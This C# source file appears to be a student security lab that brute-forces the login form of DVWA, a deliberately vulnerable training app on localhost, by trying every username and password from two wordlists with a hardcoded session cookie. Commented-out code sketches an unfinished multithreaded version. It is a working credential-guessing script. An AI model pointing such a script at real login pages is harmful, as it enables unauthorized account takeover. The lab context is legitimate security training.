using System;
using System.Net;
using System.Text;
using System.IO;
using System.Threading;

namespace Lab_OSBP_Kryuchkov_3
{
    class Program
    {
        static void Main()
        {
            Deri();
        }

        static void Deri()
        {
            StreamReader passwords = new StreamReader("passwords.txt");
            while (!passwords.EndOfStream)
            {
                string password = passwords.ReadLine();
                StreamReader logins = new StreamReader("logins.txt");
                while (!logins.EndOfStream)
                {
                    string username = logins.ReadLine();
                    WebRequest request = WebRequest.Create("http://localhost/dvwa/vulnerabilities/brute/?username=" + username + "&password=" + password + "&Login=Login");
                    request.Headers.Add("Cookie", "security=low; PHPSESSID=n5h1nk0ogk2todch4nqo45pnkk");
                    request.Method = "GET";
                    WebResponse resp = request.GetResponse();
                    Stream str = resp.GetResponseStream();
                    StreamReader strread = new StreamReader(str, Encoding.UTF8);
                    if (strread.ReadToEnd().Contains("Username and/or password incorrect.") == false)
                    {
                        Console.WriteLine("\n------------------------------------------\n");
                        Console.WriteLine(username + ", " + password);
                        Console.WriteLine("\n------------------------------------------\n");

                        continue;
                    }
                }
            }
        }

        //static bool Processing(string login, string password)
        //{
        //    WebRequest request = WebRequest.Create("http://localhost/dvwa/vulnerabilities/brute/?username=" + login + "&password=" + password + "&Login=Login");
        //    request.Headers.Add("Cookie", "security=low; PHPSESSID=n5h1nk0ogk2todch4nqo45pnkk");
        //    request.Method = "GET";
        //    WebResponse resp = request.GetResponse();
        //    Stream str = resp.GetResponseStream();
        //    StreamReader strread = new StreamReader(str, Encoding.UTF8);
        //    if (strread.ReadToEnd().Contains("Username and/or password incorrect.") == false)
        //    {
        //        return false;
        //    }
        //    else
        //    {
        //        return true;
        //    }


        //}

        //static void CreateThread(string log, string pass)
        //{
        //    int i = 0;
        //    while (i != 4)
        //    {
        //        i++;
        //        new Thread(() => { ThreadWork(log, pass); }).Start();
        //    }
        //}

        //// Подается 2 строки, 1 поток обрабатывает их - отсылает результат, потом подается
        //// вновь те же 2 строки, но обрабатывает их уже второй поток, по новой (хотя это не нужно,
        //// а нужно сделать так, чтобы обрабатывался уже второй набор слов)
        //// Помимо этого нужно, чтобы поток, выполнивший свою работу, переходил к следующему набору слов, а не закрывался/создавался новый


        //static void ThreadWork(string log, string pass)
        //{
        //    Processing(log, pass);
        //    if (Processing(log, pass) == false) 
        //    {
        //        Console.WriteLine("\n------------------------------------------\n");
        //        Console.WriteLine(log + ", " + pass);
        //        Console.WriteLine("\n------------------------------------------\n");
        //    };
        //}
    }
}
